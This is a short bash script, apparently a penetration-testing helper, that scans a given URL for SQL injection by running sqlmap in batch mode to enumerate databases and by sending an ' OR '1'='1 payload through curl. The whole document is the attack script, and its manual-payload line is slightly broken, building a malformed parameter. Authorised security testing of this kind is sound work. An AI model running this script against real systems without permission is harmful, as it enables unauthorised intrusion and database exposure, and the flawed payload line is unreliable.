#!/bin/bash
# SQL Injection Scanning Script
# Automated SQLi detection

if [ -z "$1" ]; then
  echo "Usage: $0 <target-url>"
  exit 1
fi

TARGET=$1

echo "💣 Scanning for SQL Injection"
echo ""

# Method 1: SQLMap automated
echo "[*] Running SQLMap..."
sqlmap -u "$TARGET" \
  --batch \
  --dbs \
  -o sqlmap_results.json

# Method 2: Manual payloads
echo "[*] Testing manual payloads..."
echo "' OR '1'='1" | sed "s/^/&para=/" | xargs -I {} curl -s "$TARGET?para={}" | grep -i error

echo ""
echo "✅ SQLi scan complete!"
